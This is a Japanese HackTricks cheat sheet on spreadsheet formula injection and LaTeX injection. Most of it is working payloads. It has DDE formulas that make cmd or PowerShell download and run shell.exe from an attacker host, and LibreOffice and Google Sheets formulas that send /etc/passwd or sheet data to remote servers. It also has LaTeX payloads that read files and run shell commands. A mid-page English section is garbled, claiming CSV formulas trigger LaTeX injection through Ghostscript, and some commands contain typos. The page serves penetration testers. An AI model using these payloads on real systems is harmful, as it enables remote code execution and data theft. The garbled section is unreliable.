# フォーミュラ/CSV/ドキュメント/LaTeX/GhostScript インジェクション

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

- **HackTricks で企業を宣伝**したい場合や **HackTricks をPDFでダウンロード**したい場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass) に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
- **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに PR を提出する

</details>

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、API から Web アプリやクラウドシステムまでの技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks) 今すぐ。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## フォーミュラ インジェクション

### 情報

もし、あなたの **入力** が **CSVファイル**（またはおそらく **Excel で開かれる可能性のある他のファイル**）内に **反映** されている場合、Excel **フォーミュラ**を入れることができ、ユーザーがファイルを開いたり、Excel シート内のリンクをクリックしたりすると **実行** されるかもしれません。

{% hint style="danger" %}
現在、**Excel は外部から読み込まれたものを警告**します（何度も）ユーザーが悪意ある行動を防ぐために。そのため、最終的なペイロードにはソーシャルエンジニアリングに特別な注意が必要です。
{% endhint %}

### [ワードリスト](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### ハイパーリンク

**次の例は、最終的なExcelシートからコンテンツを外部に持ち出し、任意の場所にリクエストを実行するのに非常に役立ちます。ただし、リンクをクリックして（警告プロンプトを受け入れる必要があります）。**

次の例は、[https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit) から取得されました。

学生記録管理システムでのセキュリティ侵害がCSVインジェクション攻撃を介して悪用されると想像してください。攻撃者の主な意図は、教師が学生の詳細を管理するために使用するシステムを危険にさらすことです。この方法は、攻撃者が悪意のあるペイロードをアプリケーションに注入し、具体的には学生の詳細用のフィールドに有害な数式を入力することで実行されます。攻撃は次のように展開されます：

1. **悪意のあるペイロードの注入:**
- 攻撃者は学生の詳細フォームを送信しますが、スプレッドシートで一般的に使用される数式（例：`=HYPERLINK("<malicious_link>","Click here")`）を含めます。
- この数式はハイパーリンクを作成するように設計されていますが、それは攻撃者が制御する悪意のあるサーバーを指します。

2. **侵害されたデータのエクスポート:**
- 侵害に気づかない教師は、データをCSVファイルにエクスポートするためにアプリケーションの機能を使用します。
- 開かれたCSVファイルには、依然として悪意のあるペイロードが含まれています。このペイロードはスプレッドシート内でクリック可能なハイパーリンクとして表示されます。

3. **攻撃のトリガー:**
- 教師が学生の詳細の正当な部分と信じてハイパーリンクをクリックします。
- クリックすると、機密データ（スプレッドシートや教師のコンピュータからの詳細を含む可能性があります）が攻撃者のサーバーに送信されます。

4. **データの記録:**
- 攻撃者のサーバーは、教師のコンピュータから送信された機密データを受信して記録します。
- 攻撃者はその後、このデータをさまざまな悪意のある目的に使用し、学生や機関のプライバシーとセキュリティをさらに危険にさらすことができます。


### RCE

この例が機能するためには、**次の構成を有効にする必要があります**：\
ファイル → オプション → 信頼センター → 信頼センターの設定 → 外部コンテンツ → ダイナミックデータ交換サーバーランチを有効にする\
または**古いExcelバージョン**を使用する必要があります。

良いニュースは、**このペイロードはファイルが開かれるときに自動的に実行される**ことです（ユーザーが警告を受け入れた場合）。

次のペイロードで計算機を実行することが可能です **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (8).png>)

### もっと
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* ローカルの/etc/passwdファイルから1行目を読み取ります：`='file:///etc/passwd'#$passwd.A1`
* 漏洩させます：`=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* 複数行を漏洩させます：`=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* DNS漏洩：`=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**DNS漏洩ペイロードの解析:**

* ‘file:///etc/passwd’#$passwd.A19 – ローカルの/etc/passwdファイルから19行目を読み取ります
* ENCODEURL(‘file:///etc/passwd’#$passwd.A19) – 返されたデータをURLエンコードします
* MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41) – サブストリングに類似し、1文字目から41文字目までのデータを読み取ります – DNSホスト名の長さを制限する非常に便利な方法（FQDNに254文字の制限があり、ラベルに63文字の制限があります、つまりサブドメイン）
* SUBSTITUTE(MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41),”%”,”-“) – %（URLエンコードの特殊文字）のすべてのインスタンスをダッシュに置換します – これにより、有効なDNS文字のみが使用されることが保証されます
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‘file:///etc/passwd’#$passwd.A19)),1,41),”%”,”-“)),”.\<FQDN>”) – ファイルからの出力（上記の処理が行われた後）をFQDN（ドメインの権威を持つホストにアクセスできる）と連結します
* WEBSERVICE – この存在しないDNS名にリクエストを行い、その後、ログを解析したり（またはDNS権威名サーバーでtcpdumpなどを実行したり）します。そのドメインに対して権限を持っている

### Google Sheets OOBデータ漏洩

まず、いくつかの興味深い関数を紹介しましょう。

**CONCATENATE**: 文字列を連結します。
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: XML、HTML、CSV、TSV、RSS、ATOM XMLフィードなど、さまざまな構造化データタイプからデータをインポートします。
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: RSSまたはATOMフィードをインポートします。
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: HTMLページ内のテーブルやリストからデータをインポートします。
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: 指定されたスプレッドシートからセルの範囲をインポートします。
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**画像**: セルに画像を挿入します。
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## LaTeXインジェクション

通常、**LaTeXコードをPDFに変換**するインターネット上のサーバーは**`pdflatex`**を使用します。\
このプログラムは、コマンドの実行を（無効にする）許可するために3つの主要な属性を使用します：

- **`--no-shell-escape`**：`\write18{command}`構造を無効にします。たとえtexmf.cnfファイルで有効になっていても。
- **`--shell-restricted`**：`--shell-escape`と同じですが、'安全'な事前定義された\*\*コマンドに\*\*制限されています（Ubuntu 16.04ではリストが`/usr/share/texmf/web2c/texmf.cnf`にあります）。
- **`--shell-escape`**：`\write18{command}`構造を有効にします。コマンドは任意のシェルコマンドです。この構造は通常、セキュリティ上の理由から許可されていません。

ただし、コマンドを実行する他の方法もありますので、RCEを回避するために`--shell-restricted`を使用することが非常に重要です。

### ファイルを読む <a href="#read-file" id="read-file"></a>

\[または$などのラッパーを使用してインジェクションを調整する必要があるかもしれません。
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### 1行のファイルを読む
```bash
\newread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### 複数行のファイルを読む
```bash
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
\read\file to\fileline
\text{\fileline}
\repeat
\closein\file
```
### ファイルの書き込み <a href="#write-file" id="write-file"></a>
```bash
\newwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### コマンド実行 <a href="#command-execution" id="command-execution"></a>

コマンドの入力は stdin にリダイレクトされます。それを取得するために一時ファイルを使用します。
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
### Formula CSV Document LaTeX Ghostscript Injection

---

#### Attack Scenario

An attacker can craft a malicious CSV file containing a formula that, when opened with a vulnerable spreadsheet application, triggers a LaTeX formula injection. This injection can lead to the execution of arbitrary commands on the victim's machine when the CSV file is converted to a PDF using Ghostscript.

#### Technical Details

1. Craft a CSV file with a formula that includes LaTeX syntax for executing commands.
   
2. Open the malicious CSV file with a spreadsheet application that supports formula calculations.

3. When the CSV file is converted to a PDF using Ghostscript, the LaTeX formula will be processed, potentially leading to command execution.

#### Impact

Successful exploitation of this vulnerability can result in arbitrary command execution on the victim's machine, leading to further compromise and unauthorized access.

#### Mitigation

1. Avoid opening untrusted CSV files from unknown sources.

2. Ensure that spreadsheet applications and related software are regularly updated to patch known vulnerabilities.

3. Consider using alternative formats such as XLSX that do not support formula injections through LaTeX.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### クロスサイトスクリプティング <a href="#cross-site-scripting" id="cross-site-scripting"></a>

[@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## Ghostscript Injection

TODO: [https://blog.redteam-pentesting.de/2023/ghostscript-overview/](https://blog.redteam-pentesting.de/2023/ghostscript-overview/) から、より関連性の高い情報と技術を含む要約を作成します。

## 参考文献

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<figure><img src="../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて修正を迅速化します。Intruder は攻撃対象を追跡し、積極的な脅威スキャンを実行し、API から Web アプリケーション、クラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 今すぐ。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>**ゼロからヒーローまでのAWSハッキングを学ぶ**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks を PDF でダウンロードしたい** 場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com) を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* **💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする
* **HackTricks** と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出して、あなたのハッキングトリックを共有する

</details>
